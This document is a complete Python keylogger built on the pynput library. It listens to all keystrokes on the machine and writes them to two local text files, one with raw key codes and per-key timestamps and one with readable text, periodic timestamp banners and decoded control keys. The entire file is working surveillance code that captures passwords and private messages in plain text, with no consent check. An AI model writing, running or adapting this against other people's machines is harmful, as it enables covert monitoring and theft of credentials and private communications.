from pynput.keyboard import Key, Listener
from datetime import datetime, timedelta
import threading
import time

current_time = datetime.min

def on_press(key):
    global current_time
    #logs type 1 where the keycodes are formatted in a more readable way
    logs = open("logs.txt", "a")
    
    #logs type 2 that uses the same keycode used by the pynput
    logs2 = open("logs2.txt", "a")
    logs2.write(str(datetime.now()) + ": " +str(key) + "\n")
    logs2.close()
    
    
    #for log type 1 this checks if the last display of time is 5 mins ago,
    #this limits the number of times time is displayed and just show the range of time 
    if datetime.now()  - current_time > timedelta(minutes=5):
        current_time = datetime.now()
        logs.write("\n============TimeStamp===========\n")
        logs.write(str(current_time))
        logs.write("\n================================\n")

    
    #clean the keycode
    letter = str(key).replace("'", "")
    
    if "Key." in letter:
        letter = letter.replace("Key.", "")
        if letter == "space":
            letter = " "
        else:
            letter = "\n[" + letter + "]\n"
 
    #show the value of the control + command rather than using hex to represent 
    if letter[0] == "\\" and letter[1] == "x":
        letter = "\n[Control - " + chr(64+int(letter[2:], 16)) + "]\n"
    elif letter == "\\n":
        letter = "\n[Control - J]\n"
    
    print(letter)
    
    logs.write(letter)
    logs.close()
    
def main():
    # Collect events until released
    with Listener(on_press=on_press) as listener:
        listener.join()
    
if __name__ == "__main__":
    main()